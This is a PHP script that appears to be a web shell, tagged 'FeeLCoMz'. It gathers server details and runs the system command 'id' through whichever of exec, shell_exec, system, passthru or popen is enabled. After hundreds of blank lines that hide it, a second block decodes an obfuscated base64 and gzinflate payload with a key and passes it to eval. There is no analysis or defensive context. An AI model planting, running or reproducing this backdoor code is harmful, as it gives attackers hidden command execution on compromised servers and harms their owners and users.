<?php
##[ Fx29ID ]##
fx("ID","FeeL"."CoMz");
$P   = @getcwd();
$IP  = @getenv("SERVER_ADDR");
$UID = fx29exec("id");
fx("SAFE",@safemode()?"ON":"OFF");
fx("OS",@PHP_OS);
fx("UNAME",@php_uname());
fx("SERVER",($IP)?$IP:"-");
fx("USER",@get_current_user());
fx("UID",($UID)?$UID:"uid=".@getmyuid()." gid=".@getmygid());
fx("DIR",$P);
fx("PERM",(@is_writable($P))?"[W]":"[R]");
fx("HDD","Used: ".hdd("used")." Free: ".hdd("free")." Total: ".hdd("total"));
fx("DISFUNC",@getdisfunc());
##[ FX29SHEXEC ]##
function fx($t,$c) { echo "$t: "; echo (is_array($c))?join(" ",$c):$c; echo "<br>"; }
function safemode() { return (@ini_get("safe_mode") OR eregi("on",@ini_get("safe_mode")) ) ? TRUE : FALSE; }
function getdisfunc() { $rez = explode(",",@ini_get("disable_functions")); return (!empty($rez))?$rez:array(); }
function enabled($func) { return (function_exists($func) && is_callable($func) && !in_array($func,getdisfunc())) ? TRUE : FALSE; }
function fx29exec($cmd) {
  if (enabled("exec")) { exec($cmd,$o); $rez = join("\r\n",$o); }
  elseif (enabled("shell_exec")) { $rez = shell_exec($cmd); }
  elseif (enabled("system")) { @ob_start(); @system($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }  
  elseif (enabled("passthru")) { @ob_start(); passthru($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }
  elseif (enabled("popen") && is_resource($h = popen($cmd.' 2>&1', 'r')) ) { while ( !feof($h) ) { $rez .= fread($h, 2096);  } pclose($h); }
  else { $rez = "Error!"; }
  return $rez;
}
function vsize($size) {
  if (!is_numeric($size)) { return FALSE; }
  else {
    if ( $size >= 1073741824 ) { $size = round($size/1073741824*100)/100 ." GB"; }
    elseif ( $size >= 1048576 ) { $size = round($size/1048576*100)/100 ." MB"; }
    elseif ( $size >= 1024 ) { $size = round($size/1024*100)/100 ." KB"; }
    else { $size = $size . " B"; }
    return $size;
  }
}
function hdd($type) {
  $P = @getcwd(); $T = @disk_total_space($P); $F = @disk_free_space($P); $U = $T - $U;
  $hddspace = array("total" => vsize($T), "free"  => vsize($F), "used"  => vsize($U));
  return $hddspace[$type];
}
echo("FeeLCoMz");
?>





















































































































































































































































































<?
function d($s, $k=''){if($k==''){for($i=0;$i<strlen($s);$i){$d.=chr(hexdec(substr($s, $i, 2)));$i=(float)($i)+2;}return $d;}else{$r='';$f=d('6261736536345f6465636f6465');$u=$f('Z3ppbmZsYXRl');$s=$u($f($s));for($i=0;$i<strlen($s);$i++){$c=substr($s, $i, 1);$kc=substr($k, ($i%strlen($k))-1, 1);$c=chr(ord($c)-ord($kc));$r.=$c;}return $r;}}eval(d("VZL7TuJAGMUfbfcV1HUJoMnakVvqLUqhpVNoYVpmaBvRXul0hqq0XOpGH3HR7CbuvyfnJL/zfYdGtTov8jSv/VzXj3pGr3K8ub4STo7HqFKl+Span1aKXwd3unRY2d5cs0eeh/WT94im1Wq1dvleXS55eHh98EODRvmAZcFrwCtnqZWONRPslsnnQGS2mfAZacvhdFvgZ+ohhhtmKsnB0iAou6PojbzMqbo1TJiPty2oSZNXx3H5PQAbW8H5pORpcN5fuu6zqKeiMaBcHEqktInN4yWg9pmjEIGqVt9JNGul97hJ50TnhqmtogHZGLSzgbzF7gVdtrirYr5bmvJkitUL1Rb0qQrATpNvTIRVYtqabwhQtjBRMSARxirUmqCj3wqaqrRZQJx4bN5tfU2KKW4lHsGrobWLocK2UAGLB4AFm7RbQ8lAaCqMyYDE2EJ9i+67lXLqzW7Lf75H5eItUoymTSYs5MkXvvL/LAef2aAxpT7vinoXxZZAMGEuImWgEtWc3J8lYwugF3vP0ptkLHCNTJeExYCXO8Q0E1nZQoNakgAceBnZOaTNVKXXhrK5nmPAidKW45myCBrDD42mpJv4DeMp5G+FiW8/tOekv1ujD+Ze8dlX512WKCHzS3jRnxSpk6mbAO/5Uqf0zoEIJb2Ag6D0XbTWmRiTV8BH9O/feItOFbTxzssepGI6AyMZP7myw/IMyeYMyzcDC4ym+9uvddqk+hboAdGefClefNnaBu53EBL1ZSR32YLomSZ1Mzcz1r6Zdo5vjqLfj7zmeUXSaYZBFGRhfFrhqziq1y6/f4t3WX75Bw==", 1235327122));
?>